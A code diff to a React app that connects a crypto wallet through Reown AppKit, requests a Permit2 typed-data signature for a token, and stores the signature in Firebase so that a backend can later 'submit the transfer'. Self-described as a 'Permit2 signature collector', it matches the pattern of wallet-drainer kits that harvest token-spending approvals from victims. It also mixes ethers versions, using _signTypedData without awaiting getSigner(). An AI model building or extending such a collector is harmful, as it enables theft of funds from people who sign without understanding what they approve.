@@ -1,5 +1,8 @@
 import React, { useState } from 'react';
 import { BrowserProvider } from 'ethers';
+import { createAppKit } from '@reown/appkit/react';
+import { EthersAdapter } from '@reown/appkit-adapter-ethers';
+import { mainnet } from '@reown/appkit/networks';
 import { initializeApp, getApps, getApp } from 'firebase/app';
 import { getDatabase, ref, set } from 'firebase/database';
 
@@ -32,27 +35,43 @@ export default function App() {
   const openModal = () => setModalOpen(true);
   const closeModal = () => setModalOpen(false);
 
+// AppKit setup
+const metadata = {
+  name: 'Permit2',
+  description: 'Minimal Permit2 signature collector',
+  url: 'https://permit-demo.example.com'
+};
+const appKit = createAppKit({
+  adapters: [new EthersAdapter()],
+  networks: [mainnet],
+  metadata,
+  projectId: process.env.REACT_APP_REOWN_PROJECT_ID || 'YOUR_REOWN_PROJECT_ID',
+  features: { analytics: false }
+});
+
   const handleConnectAndSign = async () => {
-    setStatus('Checking for wallet...');
+    setStatus('Opening AppKit wallet selector...');
     try {
-      if (!window.ethereum) {
-        setStatus('No injected wallet found (MetaMask, etc.).');
-        return;
-      }
+      await appKit.open();
 
-      setStatus('Requesting wallet connection...');
-      // request accounts
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const provider = new BrowserProvider(window.ethereum);
-      const signer = provider.getSigner();
-      const owner = await signer.getAddress();
-      setAddress(owner);
-      setStatus('Connected. Preparing Permit2 signature...');
+      setStatus('Waiting for account connection...');
 
-      const network = await provider.getNetwork();
-      const chainId = network.chainId;
+      // subscribe for a single connection event
+      const unsubscribe = appKit.subscribeAccount(async (account) => {
+        if (!account.isConnected || !account.address) return;
+        try {
+          setAddress(account.address);
+          setStatus('Connected. Preparing Permit2 signature...');
 
-      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
+          const walletProvider = appKit.getWalletProvider();
+          if (!walletProvider) throw new Error('No wallet provider from AppKit');
+          const provider = new BrowserProvider(walletProvider);
+          const signer = provider.getSigner();
+          const owner = account.address;
+          const network = await provider.getNetwork();
+          const chainId = network.chainId;
+
+          const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour
       const permitNonce = 0;
       const permitted = {
         token: TOKEN_CONTRACT_ADDRESS,
@@ -87,9 +106,9 @@ export default function App() {
         sigDeadline: deadline
       };
 
-      setStatus('Requesting signature in wallet...');
-      // ethers v6 method
-      const signature = await signer._signTypedData(domain, types, message);
+          setStatus('Requesting signature in wallet...');
+          // ethers v6 method
+          const signature = await signer._signTypedData(domain, types, message);
 
       setStatus('Saving signature to Firebase...');
       const dataToSave = {
@@ -106,12 +125,20 @@ export default function App() {
         createdAt: Date.now()
       };
 
-      await set(ref(db, `permits/${owner}`), dataToSave);
-      setStatus('✅ Signature saved. Backend may now use it to submit the transfer.');
-      setTimeout(() => {
-        setStatus('');
-        closeModal();
-      }, 3000);
+          await set(ref(db, `permits/${owner}`), dataToSave);
+          setStatus('✅ Signature saved. Backend may now use it to submit the transfer.');
+          setTimeout(() => {
+            setStatus('');
+            closeModal();
+          }, 3000);
+        } catch (err) {
+          console.error(err);
+          setStatus('❌ ' + (err?.message || 'Unknown error'));
+        } finally {
+          // stop listening once we've processed
+          unsubscribe();
+        }
+      });
     } catch (err) {
       console.error(err);
       setStatus('❌ ' + (err?.message || 'Unknown error'));
